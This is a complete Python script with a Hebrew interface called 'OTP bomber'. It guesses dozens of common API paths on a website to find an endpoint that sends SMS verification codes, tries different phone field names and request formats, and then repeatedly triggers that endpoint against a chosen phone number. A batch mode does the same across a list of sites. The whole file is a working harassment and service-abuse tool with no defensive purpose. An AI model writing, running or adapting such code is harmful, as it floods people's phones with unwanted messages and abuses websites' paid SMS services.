#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# bomber.py - מאתר את נקודת הקצה של "שלח קוד" באתר, ואז מפציץ אותה.

import json, os, re, sys, time
import requests

def app_dir():
    """התיקייה שליד הקובץ - גם כשהוא EXE."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

HERE = app_dir()
FOUND_FILE = os.path.join(HERE, "found.json")
SITES_FILE = os.path.join(HERE, "sites.txt")

COUNTRY_CODE = "972"      # קידומת מדינה, בלי פלוס
DELAY = 0.3               # הפסקה בין בקשות

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

# ==================================================================
#   PATHS = הניחושים. כל שורה = נתיב שהתוכנה תנסה.
#   להוסיף ניחוש = להוסיף שורה עם פסיק בסוף.
# ==================================================================
PATHS = [
    # --- בלי קידומת ---
    "/auth/otp", "/auth/send-otp", "/auth/send-code", "/auth/sms",
    "/otp", "/otp/send", "/send-otp", "/send-code", "/send-sms",
    "/sms/send", "/sms/send-code",
    "/user/otp", "/user/send-otp", "/user/send-code",
    "/phone/send-code", "/phone/otp",
    "/login/otp", "/login/send-otp", "/register/otp", "/register/send-otp",
    "/verify/send", "/verification/send", "/account/send-otp",

    # --- תחת api ---
    "/api/otp", "/api/otp/send", "/api/send-otp", "/api/send-code",
    "/api/auth/otp", "/api/auth/send-otp", "/api/auth/send-code",
    "/api/auth/sms", "/api/user/otp", "/api/user/send-otp",
    "/api/phone/send-code", "/api/sms/send", "/api/verify/send",
    "/api/verification/send", "/api/account/otp", "/api/account/send-otp",

    # --- v1 / v2 ---
    "/v1/otp/send", "/v1/send-otp", "/v1/send-code", "/v1/sms/send",
    "/v1/auth/otp", "/v1/auth/sms", "/v1/user/otp", "/v1/user/send-otp",
    "/v1/phone/send-code", "/v1/verify/send", "/v1/verification/send",
    "/v2/otp/send", "/v2/auth/otp", "/v2/auth/sms", "/v2/sms/send",
    "/v2/verify/send",

    # --- api/v1 api/v2 ---
    "/api/v1/otp", "/api/v1/otp/send", "/api/v1/send-otp",
    "/api/v1/auth/otp", "/api/v1/auth/send-otp", "/api/v1/auth/sms",
    "/api/v1/user/otp", "/api/v1/user/send-otp", "/api/v1/phone/send-code",
    "/api/v1/sms/send", "/api/v1/verify/send", "/api/v1/verification/send",
    "/api/v2/auth/otp", "/api/v2/otp/send", "/api/v2/send-otp",
    "/api/v2/verify/send",
]

FIELDS = ["phone", "phoneNumber", "mobile", "msisdn", "phone_number"]
STYLES = ["json", "form", "query"]


# ---------------- עזרים ----------------
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def ask(prompt, default=None):
    hint = f" [{default}]" if default not in (None, "") else ""
    v = input(f"{prompt}{hint}: ").strip()
    return v if v else (default if default is not None else "")


def pause(msg="\nEnter להמשך..."):
    input(msg)


def variants(phone):
    p = re.sub(r"[^\d]", "", phone)
    if p.startswith(COUNTRY_CODE):
        intl = p
    elif p.startswith("0"):
        intl = COUNTRY_CODE + p[1:]
    else:
        intl = p
    out = [intl, "+" + intl]
    if p.startswith("0"):
        out.append(p)
    seen, res = set(), []
    for x in out:
        if x not in seen:
            seen.add(x)
            res.append(x)
    return res


def call(url, style, field, value, timeout=12):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*"}
    if style == "json":
        h["Content-Type"] = "application/json"
        return requests.post(url, json={field: value}, headers=h, timeout=timeout)
    if style == "form":
        h["Content-Type"] = "application/x-www-form-urlencoded"
        return requests.post(url, data={field: value}, headers=h, timeout=timeout)
    return requests.get(url, params={field: value}, headers=h, timeout=timeout)


def classify(r):
    """hit = כנראה עבד | maybe = הנתיב קיים | none = אין כזה נתיב"""
    c = r.status_code
    if c == 404:
        return "none"
    if c == 429:
        return "hit"
    if 200 <= c < 300:
        t = (r.text or "")[:400].lower()
        bad = ('"error"', '"success":false', '"ok":false',
               '"status":false', "invalid", "required")
        return "maybe" if any(b in t for b in bad) else "hit"
    return "maybe"


def norm_base(base):
    base = base.strip().rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    return base


# ---------------- סריקה ----------------
def scan(base, phone):
    base = norm_base(base)
    vs = variants(phone)
    hits, maybes = [], []

    print(f"\nסורק {len(PATHS)} ניחושים באתר {base}")
    print(f"מספר: {vs[0]}\n")
    print("(כל בקשה שמצליחה = נשלח לך קוד אמיתי לטלפון)\n")

    for path in PATHS:
        url = base + path
        try:
            r = call(url, "json", "phone", vs[0])
        except requests.exceptions.RequestException:
            print(f"  {path}  - אין תשובה")
            continue

        if classify(r) == "none":
            print(f"  {path}  404")
            time.sleep(DELAY)
            continue

        found = None
        for style in STYLES:
            for field in FIELDS:
                for value in vs:
                    try:
                        r2 = call(url, style, field, value)
                    except requests.exceptions.RequestException:
                        continue
                    if classify(r2) == "hit":
                        found = {"url": url, "style": style, "field": field,
                                 "value": value, "code": r2.status_code,
                                 "resp": (r2.text or "")[:200]}
                        break
                    time.sleep(0.05)
                if found:
                    break
            if found:
                break

        if found:
            hits.append(found)
            print(f"  ==> {path}  עבד!  [{found['style']} / "
                  f"{found['field']}={found['value']}]  קוד {found['code']}")
            print(f"      {found['resp'][:130]}")
        else:
            maybes.append({"url": url, "code": r.status_code,
                           "resp": (r.text or "")[:200]})
            print(f"  ?  {path}  קיים אבל לא זוהה (קוד {r.status_code})")
        time.sleep(DELAY)

    print("\n" + "=" * 50)
    print(f"  נמצאו {len(hits)} שעובדים, ועוד {len(maybes)} חשודים.")
    if hits:
        with open(FOUND_FILE, "w", encoding="utf-8") as f:
            json.dump(hits, f, ensure_ascii=False, indent=2)
        print("  נשמר. אפשר להפציץ מהתפריט.")
    else:
        print("  לא נמצא. ייתכן שהאתר דורש שדות נוספים.")
    print("=" * 50)
    return hits


# ---------------- הפצצה ----------------
def bomb(hit, times, delay=0.4):
    print(f"\nשולח {times} פעמים אל {hit['url']}\n")
    ok = 0
    for i in range(1, times + 1):
        try:
            r = call(hit["url"], hit["style"], hit["field"], hit["value"])
            if r.status_code < 400:
                ok += 1
            print(f"  [{i}/{times}] {r.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"  [{i}/{times}] שגיאה: {type(e).__name__}")
        time.sleep(delay)
    print(f"\nבוצע. הצליחו {ok} מתוך {times}.")


def load_found():
    try:
        with open(FOUND_FILE, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []


# ---------------- מסכים ----------------
def do_scan():
    base = ask("כתובת האתר (למשל example.com)")
    if not base:
        return []
    phone = ask("מספר הטלפון שלך (למשל 0501234567)")
    if not phone:
        return []
    hits = scan(base, phone)
    pause()
    return hits


def do_bomb(saved):
    hits = saved or load_found()
    if not hits:
        print("\n! אין נתיב שמור. תריץ קודם סריקה (אפשרות 1).")
        pause()
        return

    clear()
    print("=== נתיבים שמורים ===\n")
    for i, h in enumerate(hits, 1):
        print(f"  {i}. {h['url']}  [{h['style']}/{h['field']}]")
    print()
    pick = ask("בחר מספר", "1")
    try:
        hit = hits[int(pick) - 1]
    except (ValueError, IndexError):
        hit = hits[0]
    try:
        times = int(ask("כמה פעמים לשלוח", "10"))
    except ValueError:
        times = 10
    bomb(hit, times)
    pause()


def do_manual():
    url = ask("כתובת מלאה (למשל https://site.com/api/auth/otp)")
    if not url:
        return
    phone = ask("מספר הטלפון")
    if not phone:
        return
    value = variants(phone)[0]
    hit = {"url": norm_base(url), "style": "json", "field": "phone",
           "value": value, "code": 0, "resp": ""}
    try:
        times = int(ask("כמה פעמים", "10"))
    except ValueError:
        times = 10
    bomb(hit, times)
    pause()


def do_scan_and_bomb():
    hits = do_scan()
    if not hits:
        return
    try:
        times = int(ask("כמה פעמים להפציץ", "10"))
    except ValueError:
        times = 10
    bomb(hits[0], times)
    pause()


def do_sites():
    try:
        with open(SITES_FILE, encoding="utf-8") as f:
            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        print(f"\n! אין קובץ sites.txt ליד התוכנה.")
        pause()
        return
    if not sites:
        print("\n! הקובץ ריק.")
        pause()
        return

    phone = ask("מספר הטלפון שלך")
    if not phone:
        return
    try:
        times = int(ask("כמה פעמים לכל אתר", "5"))
    except ValueError:
        times = 5

    all_hits = []
    for site in sites:
        print("\n" + "#" * 50)
        print(f"#  {site}")
        print("#" * 50)
        hits = scan(site, phone)
        if hits:
            all_hits.append(hits[0])
            bomb(hits[0], times)
    with open(FOUND_FILE, "w", encoding="utf-8") as f:
        json.dump(all_hits, f, ensure_ascii=False, indent=2)
    pause()


def main():
    while True:
        clear()
        saved = load_found()
        print("=" * 46)
        print("             ב ו מ ב ר   O T P")
        print("=" * 46)
        print(f"  sites.txt: {'קיים' if os.path.exists(SITES_FILE) else 'חסר'}"
              f"   |   נתיבים שמורים: {len(saved)}")
        print("-" * 46)
        print("  1. סרוק אתר (מצא את הנתיב)")
        print("  2. הפצץ (שלח שוב ושוב)")
        print("  3. סרוק ואז הפצץ")
        print("  4. סרוק רשימת אתרים מ-sites.txt")
        print("  5. הפצץ כתובת ידנית")
        print("  0. יציאה")
        print("-" * 46)
        c = ask("בחר")

        if c == "1":
            do_scan()
        elif c == "2":
            do_bomb(saved)
        elif c == "3":
            do_scan_and_bomb()
        elif c == "4":
            do_sites()
        elif c == "5":
            do_manual()
        elif c == "0":
            print("\nביי.")
            break
        else:
            print("\n! אין אפשרות כזו.")
            pause()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nיצאת.")
